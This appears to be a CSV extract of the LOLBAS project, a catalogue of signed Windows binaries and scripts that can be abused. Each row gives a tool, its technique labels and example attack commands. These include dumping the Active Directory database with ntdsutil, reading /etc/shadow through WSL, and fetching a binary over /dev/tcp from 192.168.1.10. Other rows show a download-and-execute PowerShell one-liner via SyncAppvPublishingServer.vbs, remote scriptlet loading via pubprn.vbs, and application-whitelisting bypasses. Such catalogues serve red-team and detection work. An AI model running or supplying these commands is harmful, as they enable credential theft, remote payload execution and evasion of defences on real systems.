ntdsutil.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Ntdsutil/,[['Dump']],"['ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\\"" q q']"
Powerpnt.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/,[['Download']],"['Powerpnt.exe ""http://192.168.1.10/TeamsAddinLoader.dll""']"
rcsi.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Rcsi/,"[['Execute', 'AWL bypass']]","['rcsi.exe bypass.csx', 'rcsi.exe bypass.csx']"
Sqldumper.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/,[['Dump']],"['sqldumper.exe 464 0 0x0110', 'sqldumper.exe 540 0 0x01100:40']"
Sqlps.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/,[['Execute']],['Sqlps.exe -noprofile']
SQLToolsPS.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqltoolsps/,[['Execute']],['SQLToolsPS.exe -noprofile -command Start-Process calc.exe']
Squirrel.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/,"[['Download', 'AWL bypass', 'Execute']]","['squirrel.exe --download [url to package]', 'squirrel.exe --update [url to package]', 'squirrel.exe --updateRoolback=[url to package]', 'squirrel.exe --update [url to package]', 'squirrel.exe --updateRollback=[url to package]']"
te.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/,[['Execute']],['te.exe bypass.wsc']
Tracker.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/,"[['Execute', 'AWL bypass']]","['Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe', 'Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe']"
Update.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Update/,"[['Download', 'AWL bypass', 'Execute']]","['Update.exe --download [url to package]', 'Update.exe --update=[url to package]', 'Update.exe --update=\\\\remoteserver\\payloadFolder', 'Update.exe --updateRollback=[url to package]', 'Update.exe --processStart payload.exe --process-start-args ""whatever args""', 'Update.exe --updateRollback=\\\\remoteserver\\payloadFolder', 'Update.exe --update=[url to package]', 'Update.exe --update=\\\\remoteserver\\payloadFolder', 'Update.exe --updateRollback=[url to package]', 'Update.exe --updateRollback=\\\\remoteserver\\payloadFolder', 'Update.exe --processStart payload.exe --process-start-args ""whatever args""']"
vsjitdebugger.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Vsjitdebugger/,[['Execute']],['Vsjitdebugger.exe calc.exe']
Winword.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/,[['Download']],"['winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""']"
Wsl.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/,"[['Execute', 'Download']]","['wsl.exe -e /mnt/c/Windows/System32/calc.exe', 'wsl.exe -u root -e cat /etc/shadow', ""wsl.exe --exec bash -c 'cat file'"", ""wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'""]"
CL_Mutexverifiers.ps1,https://lolbas-project.github.io/lolbas/Scripts/CL_mutexverifiers/,[['Execute']],['. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess calc.ps1']
CL_Invocation.ps1,https://lolbas-project.github.io/lolbas/Scripts/Cl_invocation/,[['Execute']],['. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1   \\nSyncInvoke  [args]']
Manage-bde.wsf,https://lolbas-project.github.io/lolbas/Scripts/Manage-bde/,[['Execute']],"['set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf', 'copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf']"
Pubprn.vbs,https://lolbas-project.github.io/lolbas/Scripts/Pubprn/,[['Execute']],['pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct']
Slmgr.vbs,https://lolbas-project.github.io/lolbas/Scripts/Slmgr/,[['Execute']],['reg.exe import c:\\path\\to\\Slmgr.reg & cscript.exe /b c:\\windows\\system32\\slmgr.vbs']
Syncappvpublishingserver.vbs,https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/,[['Execute']],"['SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""']"
winrm.vbs,https://lolbas-project.github.io/lolbas/Scripts/Winrm/,"[['Execute', 'AWL bypass']]","['winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985', 'winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""cmd.exe /k c:\\windows\\system32\\notepad.exe""} -r:http://acmedc:5985   \\nwinrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985', '%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty']"
Pester.bat,https://lolbas-project.github.io/lolbas/Scripts/pester/,[['Execute']],"['Pester.bat [/help|?|-?|/?] ""$null; notepad""']"
